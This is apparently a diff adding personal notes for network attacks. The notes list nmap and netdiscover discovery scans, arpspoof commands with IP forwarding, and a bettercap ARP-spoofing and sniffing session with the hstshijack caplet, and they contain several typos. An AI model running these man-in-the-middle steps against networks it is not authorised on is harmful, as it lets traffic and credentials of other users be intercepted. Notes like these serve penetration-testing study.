@@ -1,0 +1,43 @@
+Processes
+
+Discovery i.e Enumeration of Hosts (Operating system, Ip addresses, Ports, services),Shares, Devices(Version, Ip addresses, Ports, services)
+
+Discovery:
+
+netdiscover -r "IP ADDRESS"/"24"
+
+nmap -sn "IP ADDRESS"/"24" - Ping Scan
+nmap -T4 -F "IP ADDRESS"/"24" - Quick Scan
+nmap -sV -T4 -O -F --version-light "IP ADDRESS"/"24" - Quick Scan Plus
+
+Exploit:
+Sopofing:
+
+Arpspoofing-
+ifconfig - To find connected interface
+arpspoof -i "Ethernet Interface" -t "Client IP" "Gateway IP"- To spoof on selected iterface
+arpspoof -i "Ethernet Interface" -t "Gateway IP" "Client IP" - To spoof the gateway
+echo 1 > /proc/sys/net/ipv4/ip_forward - Forward on hacker vm to the gateway - Ip forwarding
+
+Bettercap-
+ifconfig - To find connected interface
+bettercap -iface "Ethernet Interface"
+net.prob on - scan network for hosts
+set arp.spoof.fullduplex true
+set arp.spoof.targets "Client IP"
+arp.spoof "on/off"
+net.sniff on - Enable network niffing
+
+bettercap -iface "Ethernet Interface" -caplet "script.cap) runs a custom spoofing script
+
+"
+net.probe on
+net.recon on
+set arp.spoof.fullduplex true
+set arp.spoof targets 192.168.0.199
+arp.spoof.on
+net.sniff on
+"
+caplets.show
+
+hstshijack
